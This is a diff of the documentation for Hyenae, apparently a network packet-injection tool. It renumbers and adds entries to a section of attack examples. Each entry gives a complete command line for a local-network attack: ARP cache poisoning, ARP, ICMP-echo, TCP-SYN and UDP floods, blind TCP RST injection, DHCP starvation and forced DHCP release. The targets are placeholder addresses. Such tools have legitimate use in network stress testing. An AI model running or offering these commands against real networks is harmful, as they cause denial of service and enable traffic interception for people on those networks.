@@ -72,6 +72,7 @@
     > arp-request
     > arp-reply
     > icmp-echo
+    > icmp-unreach-tcp
     > tcp
     > udp
     > dhcp-discover
@@ -93,7 +94,23 @@
   fictional host. Most of the examples outlined below will be possible only if
   the target host is on the same subnet as you are.
 
-    5.1 ICMP-Echo Flood
+    5.1 ARP-Request Flood
+
+    This attack will send an unlimited amount of ARP-Request packets from a
+    random source to all available machines on the network.
+
+    # hyenae -I 3 -a arp-request -s % -d ff:ff:ff:ff:ff:ff \
+    # -S %-% -D 00:00:00:00:00:00-192.168.0.1
+
+    5.2 ARP-Cache Poisoning
+
+    This example will send an ARP-Reply packet from a fictional source address
+    to all available machines on the network.
+
+    # hyenae -I 3 -a arp-reply -s 00:f0:21:03:c6:00 -d ff:ff:ff:ff:ff:ff \
+    # -S 11:22:33:44:55:66-192.168.0.1 -D ff:ff:ff:ff:ff:ff-0.0.0.0 -c 1
+
+    5.3 ICMP-Echo Flood
 
     This example will send a random amount of ICMP-Echo packets between 1 and
     10000 from a random source to a fictional target.
@@ -101,16 +118,16 @@
     # hyenae -I 3 -a icmp-echo -s %-% -d 00:f0:21:03:c6:00-192.168.0.1 \
     # -c 1 -c 10000
 
-    5.2 TCP-SYN Attack
+    5.4 TCP-SYN Attack
 
     This example will send an unlimited amount of TCP packets with set SYN flag,
     from a random source to a fictional target, with a random send delay between
     1 and 1000 milliseconds.
 
-    # hyenae -I 3 -a tcp -f s -s %-%@% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
+    # hyenae -I 3 -a tcp -f s -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@21 \
     # -e 1 -E 1000
 
-    5.3 Blind TCP Brute-RST Attack
+    5.5 Blind TCP Brute-RST Attack
 
     This example will send an unlimited amount of TCP packets with set RST
     flag, from a fictional random source to a fictional target, with an
@@ -119,25 +136,16 @@
     # hyenae -I 3 -a tcp -f r -s 00:c0:33:d4:03:06-192.168.0.2@1093 \
     # -d 00:f0:21:03:c6:00-192.168.0.1@21 -q 1 -Q 1
 
-    5.4 ARP-Cache Poisoning
+    5.6 UDP-Flood
 
-    This example will send an ARP-Reply packet from a fictional source address
-    to all available machines on the network.
+    This example will send an unlimited amount of UDP packets with a random
+    payload of 100 Byte, from a fictional random source to a fictional target.
 
-    # hyenae -I 3 -a arp-reply -s 00:f0:21:03:c6:00 -d ff:ff:ff:ff:ff:ff \
-    # -S 11:22:33:44:55:66-192.168.0.1 -D ff:ff:ff:ff:ff:ff-0.0.0.0 -c 1
+    # hyenae -I 3 -a udp -s %-%@%%%% -d 00:f0:21:03:c6:00-192.168.0.1@130 -p 100
 
-    5.5 ARP-Request Flood
+    5.7 DHCP-Discover Flood
 
-    This attack will send an unlimited amount of ARP-Request packets from a
-    random source to all available machines on the network.
-
-    # hyenae -I 3 -a arp-request -s % -d ff:ff:ff:ff:ff:ff \
-    # -S %-% -D 00:00:00:00:00:00-192.168.0.1
-
-    5.6 DHCP-Discover Flood
-
-    This attack will send an unlimited amount of DHCP-Discover packets from a
+    This example will send an unlimited amount of DHCP-Discover packets from a
     random source to all available machines on the network. The second example
     shows the same attack with activated "Requested IP-Address" option.
 
@@ -147,9 +155,9 @@
     # hyenae -I 3 -a dhcp-discover -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S 192.168.%.%%
 
-    5.7 DHCP-Starvation Attack
+    5.8 DHCP-Starvation Attack
 
-    This attack will send an unlimited amount of DHCP-Request packets from a
+    This example will send an unlimited amount of DHCP-Request packets from a
     random source to all available machines on the network. The DHCP-Option
     "Server Identifier" is set to the IP-Address of the destination DHCP-Server.
     The second example shows the same attack with activated "Requested
@@ -161,9 +169,9 @@
     # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
     # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.0.1 -S %
 
-    5.8 DHCP-Release Forcing
+    5.9 DHCP-Release Forcing
 
-    This attack will send a single DHCP-Release packet from a fictional source
+    This example will send a single DHCP-Release packet from a fictional source
     address to a fictional DHCP-Server. The DHCP-Option "Server Identifier" is
     set to the IP-Address of the destination DHCP-Server.
 
